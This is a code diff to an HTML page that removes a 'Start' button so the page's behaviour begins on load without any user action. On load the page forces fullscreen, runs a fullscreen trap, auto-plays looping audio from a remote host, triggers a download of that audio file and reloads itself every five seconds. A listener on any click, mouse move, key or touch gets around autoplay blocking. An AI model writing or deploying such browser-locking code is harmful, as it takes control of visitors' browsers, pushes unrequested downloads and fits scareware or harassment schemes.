@@ -56,25 +56,6 @@
       z-index: 10000;
       pointer-events: none;
     }
-
-    /* Start button for user interaction */
-    .start-button {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 20px 40px;
-      font-size: 24px;
-      background-color: #ff0000;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-      z-index: 10001;
-      border-radius: 10px;
-    }
-    .start-button.hidden {
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -84,14 +65,12 @@
     </div>
   </div>
   <div class="overlay" id="overlay"></div>
-  <button class="start-button" id="startButton">Start</button>
 
   <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>
 
   <script>
     const popup = document.getElementById('popup');
     const audio = document.getElementById('aud');
-    const startButton = document.getElementById('startButton');
     const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
 
     // Trigger MP3 download
@@ -118,12 +97,22 @@
       document.body.classList.add('fullscreen');
     }
 
-    // Play audio
+    // Play audio with fallbacks
     function tryPlayAudio() {
-      audio.play().catch((error) => {
-        console.log('Autoplay prevented:', error);
-        // Audio will play after user interaction via start button
-      });
+      const playAttempt = audio.play();
+      if (playAttempt !== undefined) {
+        playAttempt.catch((error) => {
+          console.log('Autoplay prevented:', error);
+          // Fallback: Try playing on user interactions
+          const tryPlayOnInteraction = () => {
+            audio.play().catch((err) => console.log('Interaction play failed:', err));
+          };
+          // Listen for any user interaction
+          ['click', 'mousemove', 'keydown', 'touchstart'].forEach((event) => {
+            document.addEventListener(event, tryPlayOnInteraction, { once: true });
+          });
+        });
+      }
     }
 
     // Advanced fullscreen trap
@@ -184,9 +173,7 @@
       */
     }
 
-    // Initialize after user interaction
-    function initialize() {
-      startButton.classList.add('hidden'); // Hide button
+    window.addEventListener('load', () => {
       enterFullscreen();
       trapFullscreen();
       tryPlayAudio();
@@ -198,16 +185,6 @@
       }, 5000); // 5 seconds
       // For even faster refresh (e.g., 3 seconds), uncomment below but test for stability
       // setTimeout(() => { window.location.reload(); }, 3000);
-    }
-
-    // Start button click handler
-    startButton.addEventListener('click', () => {
-      audio.play().catch((error) => console.log('Audio play failed:', error));
-      initialize();
-    });
-
-    window.addEventListener('load', () => {
-      // Wait for user interaction via start button instead of auto-initializing
     });
 
     // Handle visibility change
